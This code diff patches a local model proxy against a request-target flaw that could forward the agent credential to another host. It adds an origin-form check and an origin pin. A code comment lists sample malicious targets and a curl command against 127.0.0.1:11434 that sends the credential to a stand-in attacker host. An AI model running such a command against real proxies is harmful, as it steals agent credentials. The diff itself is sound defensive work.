@@ -233,6 +233,25 @@ export function splitNamespacedModel(
     return { provider, model: bare };
 }
 
+/**
+ * True only for an HTTP origin-form request-target: a single `/`, then
+ * something that cannot be read as an authority.
+ *
+ * Rejects `//host`, `/\host` (backslash is normalised to `/` by WHATWG URL),
+ * and anything carrying a scheme — each of which makes `new URL(target, base)`
+ * resolve to a different host entirely. See PROXYPATH-H1 at the call site.
+ */
+export function isOriginFormTarget(target: string): boolean {
+    if (!target.startsWith("/")) return false;
+    // `//x` and `/\x` both resolve as scheme-relative authorities.
+    const second = target[1];
+    if (second === "/" || second === "\\") return false;
+    // A control character can truncate or confuse downstream parsers.
+    // eslint-disable-next-line no-control-regex
+    if (/[\u0000-\u001f\u007f]/.test(target)) return false;
+    return true;
+}
+
 function detectProvider(model: string): string {
     const lower = model.toLowerCase();
     for (const [prefix, provider] of Object.entries(PROVIDER_FROM_MODEL)) {
@@ -380,7 +399,49 @@ function forwardRequest(
 
     if (!provider) provider = "openai";
 
-    const upstream = new URL(req.url ?? "/", opts.shroudUrl);
+    // PROXYPATH-H1. The request-target is attacker-controlled: anything that
+    // can reach 127.0.0.1:11434 — a web page you happen to be visiting, another
+    // process on the box — chooses it. WHATWG resolution lets a scheme-relative
+    // or absolute target REPLACE the host, and the agent credential is attached
+    // to whatever comes out:
+    //     "//evil.example/x"      -> https://evil.example/x
+    //     "/\\evil.example/y"     -> https://evil.example/y
+    //     "http://evil.example/z" -> http://evil.example/z
+    // so `curl 'http://127.0.0.1:11434//evil.example/x'` exfiltrates
+    // `agent_id:ocv_…`. This proxy has no inbound auth and a predictable port,
+    // and since 0.61.24 every `1claw run <agent>` starts one.
+    //
+    // Two independent guards, because either alone is one parser bug from
+    // failing: refuse a target that is not origin-form, then pin the resolved
+    // origin to the configured Shroud.
+    const target = req.url ?? "/";
+    if (!isOriginFormTarget(target)) {
+        res.writeHead(400, { "Content-Type": "application/json" });
+        res.end(
+            JSON.stringify({
+                error: {
+                    message:
+                        "Request target must be an absolute path on this proxy (e.g. /v1/chat/completions).",
+                    type: "invalid_request_target",
+                },
+            }),
+        );
+        return;
+    }
+
+    const upstream = new URL(target, opts.shroudUrl);
+    if (upstream.origin !== new URL(opts.shroudUrl).origin) {
+        res.writeHead(400, { "Content-Type": "application/json" });
+        res.end(
+            JSON.stringify({
+                error: {
+                    message: "Refusing to forward to a host other than the configured Shroud.",
+                    type: "upstream_origin_mismatch",
+                },
+            }),
+        );
+        return;
+    }
 
     const headers: Record<string, string> = {
         "X-Shroud-Agent-Key": opts.agentKey,
